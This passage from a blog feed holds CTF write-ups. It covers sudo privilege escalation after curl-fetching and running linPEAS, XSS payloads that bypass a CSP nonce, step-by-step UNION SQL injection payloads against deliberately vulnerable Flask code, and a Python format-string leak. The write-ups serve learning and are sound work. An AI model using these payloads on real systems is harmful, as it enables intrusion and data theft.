is some sort of Linux privilege escalation challenge. While chatting with a friend, I learn about the <a href=\"https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS\"><code class=\"language-plaintext highlighter-rouge\">linPEAS script</code></a> and decided to give it a go.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nb\">mkdir</span> /tmp/mediocre_one<span class=\"nb\">cd</span> /tmp/mediocre_onecurl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh <span class=\"o\">&gt;</span> line.sh<span class=\"nb\">chmod</span> +x line.sh./line.sh <span class=\"o\">&gt;</span> out</code></pre></div></div><p>The output of the <code class=\"language-plaintext highlighter-rouge\">linPEAS</code> script had a lot of information so I took a shortcut.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nb\">cat </span>out | <span class=\"nb\">grep </span>flag    <span class=\"o\">(</span>root<span class=\"o\">)</span> NOPASSWD: /bin/gzip <span class=\"nt\">-f</span> /root/rootflag.txt <span class=\"nt\">-t</span>hermit ALL <span class=\"o\">=</span> <span class=\"o\">(</span>root<span class=\"o\">)</span> NOPASSWD: /bin/gzip <span class=\"nt\">-f</span> /root/rootflag.txt <span class=\"nt\">-t</span>/home/hermit/flag/home/hermit/flag/userflag.txtdrwxrwxr-t 1 root   root   4096 Mar 27 04:52 flag/tmp/mediocre_one/out:hermit ALL <span class=\"o\">=</span> <span class=\"o\">(</span>root<span class=\"o\">)</span> NOPASSWD: /bin/gzip <span class=\"nt\">-f</span> /root/rootflag.txt <span class=\"nt\">-t</span>/tmp/mediocre_one/out:    <span class=\"o\">(</span>root<span class=\"o\">)</span> NOPASSWD: /bin/gzip <span class=\"nt\">-f</span> /root/rootflag.txt <span class=\"nt\">-t</span></code></pre></div></div><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nb\">sudo</span> /bin/gzip <span class=\"nt\">-f</span> /root/rootflag.txt <span class=\"nt\">-t</span>UMASS<span class=\"o\">{</span>a_test_of_integrity<span class=\"o\">}</span><span class=\"nb\">rm</span> <span class=\"nt\">-rf</span> /tmp/mediocre_one <span class=\"c\"># clean up</span></code></pre></div></div><hr /><p>My successful submissions end here. I spent quite a few hours trying the other challenges:</p><ul>  <li>[suckless2] Failed to escape from the jail script written in <a href=\"https://myrlang.org/\">Myrddin</a> language.</li>  <li>[replme] Failed to figure out the <a href=\"https://janet-lang.org/\">Janet</a> language <code class=\"language-plaintext highlighter-rouge\">repl</code> challenge.</li>  <li>[malware] Failed to decrypt these encrypted <a href=\"/assets/img/umass/fails/malware.zip\">files</a> with a python script.</li>  <li>[easy as 123] Failed to extract the flag from easy.pcap [30MB] with Wireshark. My suspect was 19 or 36. (forgot)</li>  <li>[chicken] Failed to extract anything useful from the <a href=\"/assets/img/umass/fails/chicken.pdf\">chicken.pdf</a>. (<a href=\"https://www.youtube.com/watch?v=yL_-1d9OSdk\">fun source</a>)</li></ul><p>Anyway, I enjoyed the UMass CTF 2021 event. Thanks to those who organized and sponsored the event.</p>",
            "url": "mediocreone.com/2021/03/29/umass-ctf-2021",
            
            
            
            "tags": ["CTF","PHP shell","python jail","QR recovery","memory forensics","linux priviledge escalation"],
            
            "date_published": "2021-03-29T00:00:00+00:00",
            "date_modified": "2021-03-29T00:00:00+00:00",
            
                "author":  {
                "name": "mediocre_one",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "mediocreone.com/2021/03/14/break-the-syntax",
            "title": "Break the syntax",
            "summary": "Break the syntax CTF notes",
            "content_text": "It’s has been a while since I played CTF games. Anyway, I share my struggles as an amateur player.1. Web challenge - Never gonna give you flagThis landing page contained 6 links where 2 of them contained below interesting codes.&lt;html&gt;&lt;head&gt;&lt;script src=\"jquery-3.5.1.min.js\"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;  &lt;div&gt; Rick never gonna: &lt;/div&gt;  &lt;p id=\"rick-says\"&gt;  &lt;/p&gt;  &lt;img src=\"images/rick6.jpg\"&gt;  &lt;script nonce=\"JIYr435smMmKG1nAAFNlrKUewAEaTWt1\"&gt;    var arg = decodeURIComponent(window.location.search.substr(1).split('=')[1]);    if (arg !== \"undefined\") {      $('#rick-says').append(arg);    }    //console.log(arg)  &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;&lt;html&gt;&lt;head&gt;&lt;script src=\"jquery-3.5.1.min.js\"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;  &lt;img src=\"images/rick2.jpg\" nonce=\"JIYr435smMmKG1nAAFNlrKUewAEaTWt1\"&gt;  &lt;script nonce=\"JIYr435smMmKG1nAAFNlrKUewAEaTWt1\"&gt;    $.ajax({      url: \"flag.php\",      headers: {        \"Nonce\": \"JIYr435smMmKG1nAAFNlrKUewAEaTWt1\"      },      success: function (result) {        console.log(result);      }    });  &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;The first page exposed XSS vulnerability and the second one hinted toward the flag. My first task was to successfully get XSS! message in the developer console../Never_gonna_say_goodbye.html?search=&lt;script&gt;console.log(\"XSS!\")&lt;/script&gt;This attempt threw a Content Security Policy error in the developer console. So fixed it with my second try../Never_gonna_say_goodbye.html?search=&lt;script nonce=\"JIYr435smMmKG1nAAFNlrKUewAEaTWt1\"&gt;console.log(\"XSS!\")&lt;/script&gt;The previous error was gone but the arg variable held only &lt;script nonce part from my payload. So replaced = sign with %3D to get around the split../Never_gonna_say_goodbye.html?search=&lt;script nonce%3D\"JIYr435smMmKG1nAAFNlrKUewAEaTWt1\"&gt;console.log(\"XSS!\")&lt;/script&gt;Finally, the “XSS!” message arrived in the dev console. Good to go for the flag../Never_gonna_say_goodbye.html?search=&lt;script nonce%3D\"JIYr435smMmKG1nAAFNlrKUewAEaTWt1\"&gt;$.ajax({ url: \"flag.php\", headers: { \"Nonce\": \"JIYr435smMmKG1nAAFNlrKUewAEaTWt1\" }, success: function (r) { console.log(r); } });&lt;/script&gt;The flag received in the dev console: BtS-CTF{r1cK_g4v3_uP_y0ure_h3lpl3ss}.2. Web challenge - Cheated lotteryThe landing page source hinted at the /?source=1 endpoint that contained the server-side code.from flask import Flask, render_template, request from dotenv import load_dotenv import mysql.connector import os load_dotenv() def get_coupons(form):  coupons = list()  mydb = mysql.connector.connect( host=os.getenv('mysql_host'), user=os.getenv('mysql_user'), password=os.getenv('mysql_pwd'), database=os.getenv('mysql_db') ) mycursor = mydb.cursor()  try:    mycursor.execute(\"SELECT * FROM coupons WHERE code = '\" + str(form['cid']) + \"'\")  except:    pass      myresult = mycursor.fetchall()      for x in myresult:        coupons.append({ 'code': x[1], 'value': x[2] })        mycursor.close()        return couponsapp = Flask(__name__)@app.route('/', methods=['POST', 'GET'])def index(source=None):  if request.method == \"POST\":    coupons = get_coupons(request.form)    if coupons == []:      return render_template('list.html', error=\"Sorry, you didn't win\")    else:      return render_template('list.html', coupons=coupons)  else:    if request.args.get('source') == '1':      with open(__file__, 'r') as r:        return r.read().strip()    else:      return render_template('base.html')if __name__ == \"__main__\":  app.run(host=\"0.0.0.0\", port=7331)The code section to query MySQL database is intentionally left exposed to SQL Injections.sqlmap -r ./request.txt -p cidThe SQLmap tool reported that UNION attack with 3 columns is the way to go.My first injection was for acquiring the database name: test' UNION SELECT DATABASE(), DATABASE(), DATABASE() WHERE 'x' = 'xThe actual executed query becomes:SELECT * FROM coupons WHERE code = 'test' UNION SELECT DATABASE(), DATABASE(), DATABASE() WHERE 'x' = 'x'Received the database name as ff86e476b1344851f095759d1eeccda72d9363ad. The second injection was to list all tables in this database: test' UNION SELECT NULL, table_name, table_type FROM information_schema.tables WHERE 'x' = 'xThe correctly executed query becomes:SELECT * FROM coupons WHERE code = 'test' UNION SELECT NULL, table_name, table_type FROM information_schema.tables WHERE 'x' = 'x'Revealed table names were c2VjcmV0LWRi and coupons. The third injection was to get column names of the c2VjcmV0LWRi table: test' UNION SELECT NULL, column_name, column_name FROM information_schema.columns WHERE table_schema  = 'ff86e476b1344851f095759d1eeccda72d9363ad' AND table_name = 'c2VjcmV0LWRi The correctly executed query becomes:SELECT * FROM coupons WHERE code = 'test' UNION SELECT NULL, column_name, column_name FROM information_schema.columns WHERE table_schema  = 'ff86e476b1344851f095759d1eeccda72d9363ad' AND table_name = 'c2VjcmV0LWRi'Revealed only one column named ZGVmaW5pdGVseS1ub3QtZmxhZw. The fourth injection explored the data of the c2VjcmV0LWRi table: test' UNION SELECT NULL, ZGVmaW5pdGVseS1ub3QtZmxhZw, ZGVmaW5pdGVseS1ub3QtZmxhZw FROM c2VjcmV0LWRi WHERE 'x' = 'xThe correctly executed query becomes:SELECT * FROM coupons WHERE code = 'test' UNION SELECT NULL, ZGVmaW5pdGVseS1ub3QtZmxhZw, ZGVmaW5pdGVseS1ub3QtZmxhZw FROM c2VjcmV0LWRi WHERE 'x' = 'x'The flag BtS-CTF{7h475_h0w_y0u_ch347_1n_94m35} was only thing in table c2VjcmV0LWRi.3. OSINT challenge - Lost Photos  God! All my photos from Moscow are gone, Hard disk had some problems, Usually it happens to my friends, Not to me, Thomas Garminas will be so upset.PS.: When you find what you are looking for, just put it between curly brackets and win this challengeSubmitting BtS-CTF{02.12.2017} failed. I was afraid that the flag might be in this silent video.By luck, Firefox saved the day. Chrome was not showing the hint. BtS-CTF{Amaranthe} - accepted.4. Misc challenge - Simple game calculatorA simple python game source code was exposed via the debug option.import os, sysclass Multiplayer(object):    def __init__(self, name, difficulty, players):        self.name = name        self.difficulty = \"easy\" # No one will create hard game, no need to implement it        self.players = players    def show_details(self):        print('{0.players} can play this easy game called' + self.name).format(self)class CTFGame(object):    def __init__(self):        self.flag = \"asd\"games = {    'multi': list()}def user_choice():    menu = \"\"\"    Welcome to Simple Game Creator where you can create your game of choice!    1. View all games    2. Create your own multiplayer game    \"\"\"    print(menu)    sys.stdout.write(\"Choose wisely &gt;&gt; \")    sys.stdout.flush()    return sys.stdin.readline()def add_multi():    sys.stdout.write(\"Name your own multiplayer game &gt;&gt; \")    sys.stdout.flush()    name = sys.stdin.readline().strip()    sys.stdout.write(\"What difficulty will it have (hard, easy)? &gt;&gt; \")    sys.stdout.flush()    diff = sys.stdin.readline().strip()    sys.stdout.write(\"How many players can play this? &gt;&gt; \")    sys.stdout.flush()    players = sys.stdin.readline().strip()    games['multi'].append(Multiplayer(name, diff, players))    print(\"You created your own multiplayer game\")def show_games():    print(\"\\nYour games: \")    print(\"\\nMultiplayers: \")    for multi in games['multi']:        multi.show_details()    print(\"\")def main():    banner = \"\"\"Banner\"\"\"    while True:        print(banner)        sys.stdout.flush()        choice = user_choice().strip()        choices = {            '1': show_games,            '2': add_multi        }        ans = choices.get(choice, None)        if not ans:            print(\"There is no such option mate\")        else:            ans()if __name__ == \"__main__\":    main()Several years ago, I read an article about the format string vulnerability in C code. Until today, I never imagined the concept can be applied to python as well. The only thing fishy in the code was the print statement with formatting. Google: “format string vulnerability python” yielded this GeeksForGeeks article. I was able to manage to come up with  {0.__init__.__globals__} to read the flag in the game. Anyway, these were all the challenges that I successfully solved during the live event. Event ended about an hour ago, organizers have already published everything to this git repository.Thanks to those who organized and sponsored the event. It was a really fun experience for me after all.",
            "content_html": "<p>It’s has been a while since I played CTF games. Anyway, I share my struggles as an amateur player.</p><h3 id=\"1-web-challenge---never-gonna-give-you-flag\">1. Web challenge - Never gonna give you flag</h3><p><img src=\"/assets/img/never-gonna-give-you-flag.png\" alt=\"Landing page\" /></p><p>This landing page contained 6 links where 2 of them contained below interesting codes.</p><div class=\"language-html highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nt\">&lt;html&gt;</span><span class=\"nt\">&lt;head&gt;&lt;script </span><span class=\"na\">src=</span><span class=\"s\">\"jquery-3.5.1.min.js\"</span><span class=\"nt\">&gt;&lt;/script&gt;&lt;/head&gt;</span><span class=\"nt\">&lt;body&gt;</span>  <span class=\"nt\">&lt;div&gt;</span> Rick never gonna: <span class=\"nt\">&lt;/div&gt;</span>  <span class=\"nt\">&lt;p</span> <span class=\"na\">id=</span><span class=\"s\">\"rick-says\"</span><span class=\"nt\">&gt;</span>  <span class=\"nt\">&lt;/p&gt;</span>  <span class=\"nt\">&lt;img</span> <span class=\"na\">src=</span><span class=\"s\">\"images/rick6.jpg\"</span><span class=\"nt\">&gt;</span>  <span class=\"nt\">&lt;script </span><span class=\"na\">nonce=</span><span class=\"s\">\"JIYr435smMmKG1nAAFNlrKUewAEaTWt1\"</span><span class=\"nt\">&gt;</span>    <span class=\"kd\">var</span> <span class=\"nx\">arg</span> <span class=\"o\">=</span> <span class=\"nb\">decodeURIComponent</span><span class=\"p\">(</span><span class=\"nb\">window</span><span class=\"p\">.</span><span class=\"nx\">location</span><span class=\"p\">.</span><span class=\"nx\">search</span><span class=\"p\">.</span><span class=\"nx\">substr</span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">).</span><span class=\"nx\">split</span><span class=\"p\">(</span><span class=\"dl\">'</span><span class=\"s1\">=</span><span class=\"dl\">'</span><span class=\"p\">)[</span><span class=\"mi\">1</span><span class=\"p\">]);</span>    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">arg</span> <span class=\"o\">!==</span> <span class=\"dl\">\"</span><span class=\"s2\">undefined</span><span class=\"dl\">\"</span><span class=\"p\">)</span> <span class=\"p\">{</span>      <span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"dl\">'</span><span class=\"s1\">#rick-says</span><span class=\"dl\">'</span><span class=\"p\">).</span><span class=\"nx\">append</span><span class=\"p\">(</span><span class=\"nx\">arg</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"c1\">//console.log(arg)</span>  <span class=\"nt\">&lt;/script&gt;</span><span class=\"nt\">&lt;/body&gt;</span><span class=\"nt\">&lt;/html&gt;</span></code></pre></div></div><div class=\"language-html highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nt\">&lt;html&gt;</span><span class=\"nt\">&lt;head&gt;&lt;script </span><span class=\"na\">src=</span><span class=\"s\">\"jquery-3.5.1.min.js\"</span><span class=\"nt\">&gt;&lt;/script&gt;&lt;/head&gt;</span><span class=\"nt\">&lt;body&gt;</span>  <span class=\"nt\">&lt;img</span> <span class=\"na\">src=</span><span class=\"s\">\"images/rick2.jpg\"</span> <span class=\"na\">nonce=</span><span class=\"s\">\"JIYr435smMmKG1nAAFNlrKUewAEaTWt1\"</span><span class=\"nt\">&gt;</span>  <span class=\"nt\">&lt;script </span><span class=\"na\">nonce=</span><span class=\"s\">\"JIYr435smMmKG1nAAFNlrKUewAEaTWt1\"</span><span class=\"nt\">&gt;</span>    <span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">ajax</span><span class=\"p\">({</span>      <span class=\"na\">url</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">flag.php</span><span class=\"dl\">\"</span><span class=\"p\">,</span>      <span class=\"na\">headers</span><span class=\"p\">:</span> <span class=\"p\">{</span>        <span class=\"dl\">\"</span><span class=\"s2\">Nonce</span><span class=\"dl\">\"</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">JIYr435smMmKG1nAAFNlrKUewAEaTWt1</span><span class=\"dl\">\"</span>      <span class=\"p\">},</span>      <span class=\"na\">success</span><span class=\"p\">:</span> <span class=\"kd\">function</span> <span class=\"p\">(</span><span class=\"nx\">result</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"nx\">result</span><span class=\"p\">);</span>      <span class=\"p\">}</span>    <span class=\"p\">});</span>  <span class=\"nt\">&lt;/script&gt;</span><span class=\"nt\">&lt;/body&gt;</span><span class=\"nt\">&lt;/html&gt;</span></code></pre></div></div><p>The first page exposed XSS vulnerability and the second one hinted toward the flag. My first task was to successfully get <code class=\"language-plaintext highlighter-rouge\">XSS!</code> message in the developer console.</p><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>./Never_gonna_say_goodbye.html?search=&lt;script&gt;console.log(\"XSS!\")&lt;/script&gt;</code></pre></div></div><p>This attempt threw a Content Security Policy error in the developer console. So fixed it with my second try.</p><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>./Never_gonna_say_goodbye.html?search=&lt;script nonce=\"JIYr435smMmKG1nAAFNlrKUewAEaTWt1\"&gt;console.log(\"XSS!\")&lt;/script&gt;</code></pre></div></div><p>The previous error was gone but the <code class=\"language-plaintext highlighter-rouge\">arg</code> variable held only <code class=\"language-plaintext highlighter-rouge\">&lt;script nonce</code> part from my payload. So replaced <code class=\"language-plaintext highlighter-rouge\">=</code> sign with <code class=\"language-plaintext highlighter-rouge\">%3D</code> to get around the split.</p><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>./Never_gonna_say_goodbye.html?search=&lt;script nonce%3D\"JIYr435smMmKG1nAAFNlrKUewAEaTWt1\"&gt;console.log(\"XSS!\")&lt;/script&gt;</code></pre></div></div><p>Finally, the “XSS!” message arrived in the dev console. Good to go for the flag.</p><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>./Never_gonna_say_goodbye.html?search=&lt;script nonce%3D\"JIYr435smMmKG1nAAFNlrKUewAEaTWt1\"&gt;$.ajax({ url: \"flag.php\", headers: { \"Nonce\": \"JIYr435smMmKG1nAAFNlrKUewAEaTWt1\" }, success: function (r) { console.log(r); } });&lt;/script&gt;</code></pre></div></div><p>The flag received in the dev console: <code class=\"language-plaintext highlighter-rouge\">BtS-CTF{r1cK_g4v3_uP_y0ure_h3lpl3ss}</code>.</p><hr /><h3 id=\"2-web-challenge---cheated-lottery\">2. Web challenge - Cheated lottery</h3><p><img src=\"/assets/img/cheated-lottery.png\" alt=\"Landing page\" />The landing page source hinted at the <code class=\"language-plaintext highlighter-rouge\">/?source=1</code> endpoint that contained the server-side code.</p><div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"kn\">from</span> <span class=\"nn\">flask</span> <span class=\"kn\">import</span> <span class=\"n\">Flask</span><span class=\"p\">,</span> <span class=\"n\">render_template</span><span class=\"p\">,</span> <span class=\"n\">request</span> <span class=\"kn\">from</span> <span class=\"nn\">dotenv</span> <span class=\"kn\">import</span> <span class=\"n\">load_dotenv</span> <span class=\"kn\">import</span> <span class=\"nn\">mysql.connector</span> <span class=\"kn\">import</span> <span class=\"nn\">os</span> <span class=\"n\">load_dotenv</span><span class=\"p\">()</span> <span class=\"k\">def</span> <span class=\"nf\">get_coupons</span><span class=\"p\">(</span><span class=\"n\">form</span><span class=\"p\">):</span>  <span class=\"n\">coupons</span> <span class=\"o\">=</span> <span class=\"nb\">list</span><span class=\"p\">()</span>  <span class=\"n\">mydb</span> <span class=\"o\">=</span> <span class=\"n\">mysql</span><span class=\"p\">.</span><span class=\"n\">connector</span><span class=\"p\">.</span><span class=\"n\">connect</span><span class=\"p\">(</span> <span class=\"n\">host</span><span class=\"o\">=</span><span class=\"n\">os</span><span class=\"p\">.</span><span class=\"n\">getenv</span><span class=\"p\">(</span><span class=\"s\">'mysql_host'</span><span class=\"p\">),</span> <span class=\"n\">user</span><span class=\"o\">=</span><span class=\"n\">os</span><span class=\"p\">.</span><span class=\"n\">getenv</span><span class=\"p\">(</span><span class=\"s\">'mysql_user'</span><span class=\"p\">),</span> <span class=\"n\">password</span><span class=\"o\">=</span><span class=\"n\">os</span><span class=\"p\">.</span><span class=\"n\">getenv</span><span class=\"p\">(</span><span class=\"s\">'mysql_pwd'</span><span class=\"p\">),</span> <span class=\"n\">database</span><span class=\"o\">=</span><span class=\"n\">os</span><span class=\"p\">.</span><span class=\"n\">getenv</span><span class=\"p\">(</span><span class=\"s\">'mysql_db'</span><span class=\"p\">)</span> <span class=\"p\">)</span> <span class=\"n\">mycursor</span> <span class=\"o\">=</span> <span class=\"n\">mydb</span><span class=\"p\">.</span><span class=\"n\">cursor</span><span class=\"p\">()</span>  <span class=\"k\">try</span><span class=\"p\">:</span>    <span class=\"n\">mycursor</span><span class=\"p\">.</span><span class=\"n\">execute</span><span class=\"p\">(</span><span class=\"s\">\"SELECT * FROM coupons WHERE code = '\"</span> <span class=\"o\">+</span> <span class=\"nb\">str</span><span class=\"p\">(</span><span class=\"n\">form</span><span class=\"p\">[</span><span class=\"s\">'cid'</span><span class=\"p\">])</span> <span class=\"o\">+</span> <span class=\"s\">\"'\"</span><span class=\"p\">)</span>  <span class=\"k\">except</span><span class=\"p\">:</span>    <span class=\"k\">pass</span>      <span class=\"n\">myresult</span> <span class=\"o\">=</span> <span class=\"n\">mycursor</span><span class=\"p\">.</span><span class=\"n\">fetchall</span><span class=\"p\">()</span>      <span class=\"k\">for</span> <span class=\"n\">x</span> <span class=\"ow\">in</span> <span class=\"n\">myresult</span><span class=\"p\">:</span>        <span class=\"n\">coupons</span><span class=\"p\">.</span><span class=\"n\">append</span><span class=\"p\">({</span> <span class=\"s\">'code'</span><span class=\"p\">:</span> <span class=\"n\">x</span><span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">],</span> <span class=\"s\">'value'</span><span class=\"p\">:</span> <span class=\"n\">x</span><span class=\"p\">[</span><span class=\"mi\">2</span><span class=\"p\">]</span> <span class=\"p\">})</span>        <span class=\"n\">mycursor</span><span class=\"p\">.</span><span class=\"n\">close</span><span class=\"p\">()</span>        <span class=\"k\">return</span> <span class=\"n\">coupons</span><span class=\"n\">app</span> <span class=\"o\">=</span> <span class=\"n\">Flask</span><span class=\"p\">(</span><span class=\"n\">__name__</span><span class=\"p\">)</span><span class=\"o\">@</span><span class=\"n\">app</span><span class=\"p\">.</span><span class=\"n\">route</span><span class=\"p\">(</span><span class=\"s\">'/'</span><span class=\"p\">,</span> <span class=\"n\">methods</span><span class=\"o\">=</span><span class=\"p\">[</span><span class=\"s\">'POST'</span><span class=\"p\">,</span> <span class=\"s\">'GET'</span><span class=\"p\">])</span><span class=\"k\">def</span> <span class=\"nf\">index</span><span class=\"p\">(</span><span class=\"n\">source</span><span class=\"o\">=</span><span class=\"bp\">None</span><span class=\"p\">):</span>  <span class=\"k\">if</span> <span class=\"n\">request</span><span class=\"p\">.</span><span class=\"n\">method</span> <span class=\"o\">==</span> <span class=\"s\">\"POST\"</span><span class=\"p\">:</span>    <span class=\"n\">coupons</span> <span class=\"o\">=</span> <span class=\"n\">get_coupons</span><span class=\"p\">(</span><span class=\"n\">request</span><span class=\"p\">.</span><span class=\"n\">form</span><span class=\"p\">)</span>    <span class=\"k\">if</span> <span class=\"n\">coupons</span> <span class=\"o\">==</span> <span class=\"p\">[]:</span>      <span class=\"k\">return</span> <span class=\"n\">render_template</span><span class=\"p\">(</span><span class=\"s\">'list.html'</span><span class=\"p\">,</span> <span class=\"n\">error</span><span class=\"o\">=</span><span class=\"s\">\"Sorry, you didn't win\"</span><span class=\"p\">)</span>    <span class=\"k\">else</span><span class=\"p\">:</span>      <span class=\"k\">return</span> <span class=\"n\">render_template</span><span class=\"p\">(</span><span class=\"s\">'list.html'</span><span class=\"p\">,</span> <span class=\"n\">coupons</span><span class=\"o\">=</span><span class=\"n\">coupons</span><span class=\"p\">)</span>  <span class=\"k\">else</span><span class=\"p\">:</span>    <span class=\"k\">if</span> <span class=\"n\">request</span><span class=\"p\">.</span><span class=\"n\">args</span><span class=\"p\">.</span><span class=\"n\">get</span><span class=\"p\">(</span><span class=\"s\">'source'</span><span class=\"p\">)</span> <span class=\"o\">==</span> <span class=\"s\">'1'</span><span class=\"p\">:</span>      <span class=\"k\">with</span> <span class=\"nb\">open</span><span class=\"p\">(</span><span class=\"n\">__file__</span><span class=\"p\">,</span> <span class=\"s\">'r'</span><span class=\"p\">)</span> <span class=\"k\">as</span> <span class=\"n\">r</span><span class=\"p\">:</span>        <span class=\"k\">return</span> <span class=\"n\">r</span><span class=\"p\">.</span><span class=\"n\">read</span><span class=\"p\">().</span><span class=\"n\">strip</span><span class=\"p\">()</span>    <span class=\"k\">else</span><span class=\"p\">:</span>      <span class=\"k\">return</span> <span class=\"n\">render_template</span><span class=\"p\">(</span><span class=\"s\">'base.html'</span><span class=\"p\">)</span><span class=\"k\">if</span> <span class=\"n\">__name__</span> <span class=\"o\">==</span> <span class=\"s\">\"__main__\"</span><span class=\"p\">:</span>  <span class=\"n\">app</span><span class=\"p\">.</span><span class=\"n\">run</span><span class=\"p\">(</span><span class=\"n\">host</span><span class=\"o\">=</span><span class=\"s\">\"0.0.0.0\"</span><span class=\"p\">,</span> <span class=\"n\">port</span><span class=\"o\">=</span><span class=\"mi\">7331</span><span class=\"p\">)</span></code></pre></div></div><p>The code section to query MySQL database is intentionally left exposed to SQL Injections.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>sqlmap <span class=\"nt\">-r</span> ./request.txt <span class=\"nt\">-p</span> cid</code></pre></div></div><p>The SQLmap tool reported that <code class=\"language-plaintext highlighter-rouge\">UNION attack</code> with 3 columns is the way to go.My first injection was for acquiring the database name: <code class=\"language-plaintext highlighter-rouge\">test' UNION SELECT DATABASE(), DATABASE(), DATABASE() WHERE 'x' = 'x</code><br />The actual executed query becomes:</p><div class=\"language-sql highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">SELECT</span> <span class=\"o\">*</span> <span class=\"k\">FROM</span> <span class=\"n\">coupons</span> <span class=\"k\">WHERE</span> <span class=\"n\">code</span> <span class=\"o\">=</span> <span class=\"s1\">'test'</span> <span class=\"k\">UNION</span> <span class=\"k\">SELECT</span> <span class=\"k\">DATABASE</span><span class=\"p\">(),</span> <span class=\"k\">DATABASE</span><span class=\"p\">(),</span> <span class=\"k\">DATABASE</span><span class=\"p\">()</span> <span class=\"k\">WHERE</span> <span class=\"s1\">'x'</span> <span class=\"o\">=</span> <span class=\"s1\">'x'</span></code></pre></div></div><p>Received the database name as <code class=\"language-plaintext highlighter-rouge\">ff86e476b1344851f095759d1eeccda72d9363ad</code>. The second injection was to list all tables in this database: <code class=\"language-plaintext highlighter-rouge\">test' UNION SELECT NULL, table_name, table_type FROM information_schema.tables WHERE 'x' = 'x</code><br />The correctly executed query becomes:</p><div class=\"language-sql highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">SELECT</span> <span class=\"o\">*</span> <span class=\"k\">FROM</span> <span class=\"n\">coupons</span> <span class=\"k\">WHERE</span> <span class=\"n\">code</span> <span class=\"o\">=</span> <span class=\"s1\">'test'</span> <span class=\"k\">UNION</span> <span class=\"k\">SELECT</span> <span class=\"k\">NULL</span><span class=\"p\">,</span> <span class=\"k\">table_name</span><span class=\"p\">,</span> <span class=\"n\">table_type</span> <span class=\"k\">FROM</span> <span class=\"n\">information_schema</span><span class=\"p\">.</span><span class=\"n\">tables</span> <span class=\"k\">WHERE</span> <span class=\"s1\">'x'</span> <span class=\"o\">=</span> <span class=\"s1\">'x'</span></code></pre></div></div><p>Revealed table names were <code class=\"language-plaintext highlighter-rouge\">c2VjcmV0LWRi</code> and <code class=\"language-plaintext highlighter-rouge\">coupons</code>. The third injection was to get column names of the <code class=\"language-plaintext highlighter-rouge\">c2VjcmV0LWRi</code> table: <code class=\"language-plaintext highlighter-rouge\">test' UNION SELECT NULL, column_name, column_name FROM information_schema.columns WHERE table_schema  = 'ff86e476b1344851f095759d1eeccda72d9363ad' AND table_name = 'c2VjcmV0LWRi</code> <br />The correctly executed query becomes:</p><div class=\"language-sql highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">SELECT</span> <span class=\"o\">*</span> <span class=\"k\">FROM</span> <span class=\"n\">coupons</span> <span class=\"k\">WHERE</span> <span class=\"n\">code</span> <span class=\"o\">=</span> <span class=\"s1\">'test'</span> <span class=\"k\">UNION</span> <span class=\"k\">SELECT</span> <span class=\"k\">NULL</span><span class=\"p\">,</span> <span class=\"k\">column_name</span><span class=\"p\">,</span> <span class=\"k\">column_name</span> <span class=\"k\">FROM</span> <span class=\"n\">information_schema</span><span class=\"p\">.</span><span class=\"n\">columns</span> <span class=\"k\">WHERE</span> <span class=\"n\">table_schema</span>  <span class=\"o\">=</span> <span class=\"s1\">'ff86e476b1344851f095759d1eeccda72d9363ad'</span> <span class=\"k\">AND</span> <span class=\"k\">table_name</span> <span class=\"o\">=</span> <span class=\"s1\">'c2VjcmV0LWRi'</span></code></pre></div></div><p>Revealed only one column named <code class=\"language-plaintext highlighter-rouge\">ZGVmaW5pdGVseS1ub3QtZmxhZw</code>. The fourth injection explored the data of the <code class=\"language-plaintext highlighter-rouge\">c2VjcmV0LWRi</code> table: <code class=\"language-plaintext highlighter-rouge\">test' UNION SELECT NULL, ZGVmaW5pdGVseS1ub3QtZmxhZw, ZGVmaW5pdGVseS1ub3QtZmxhZw FROM c2VjcmV0LWRi WHERE 'x' = 'x</code><br />The correctly executed query becomes:</p><div class=\"language-sql highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">SELECT</span> <span class=\"o\">*</span> <span class=\"k\">FROM</span> <span class=\"n\">coupons</span> <span class=\"k\">WHERE</span> <span class=\"n\">code</span> <span class=\"o\">=</span> <span class=\"s1\">'test'</span> <span class=\"k\">UNION</span> <span class=\"k\">SELECT</span> <span class=\"k\">NULL</span><span class=\"p\">,</span> <span class=\"n\">ZGVmaW5pdGVseS1ub3QtZmxhZw</span><span class=\"p\">,</span> <span 